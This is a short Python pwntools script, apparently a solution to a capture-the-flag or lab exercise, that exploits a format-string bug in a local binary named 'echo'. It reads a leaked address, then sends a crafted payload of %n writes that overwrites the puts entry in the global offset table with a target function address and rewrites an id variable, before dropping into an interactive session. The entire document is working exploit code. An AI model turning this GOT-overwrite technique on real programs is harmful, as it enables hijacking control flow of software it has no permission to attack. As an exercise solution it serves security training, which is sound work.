from pwn import *
context.arch = 'amd64'
context.log_level = 'debug' 
sh = process("./echo", env={"LD_LIBRARY_PATH":"."})
sh.recvuntil("Remeber that &id = ")
id_addr = int(sh.recvuntil("\n"),16)
sh.recvuntil("You can exactly 256 charecters ...\n") 

elf=ELF('./echo')
puts_got=elf.got['puts']
target_addr = elf.plt["target_function_3180105507"]

# id = 0xbd8c8f23
id_1 = 0xbd8c
id_2 = 0x8f23

# target_addr=0x401840
payload = "%64c%14$lln" + "%216c%15$hhn" + "%40c%16$hhn%" +str(id_2-320) + "c%17$lln%" + str(id_1-id_2) + "c%18$hn" + "aaa" + (p64(puts_got) + p64(puts_got+1) + p64(puts_got+2) + p64(id_addr) + p64(id_addr+2)).decode("iso-8859-1") 

sh.sendline(payload)
print(sh.recv())
sh.interactive()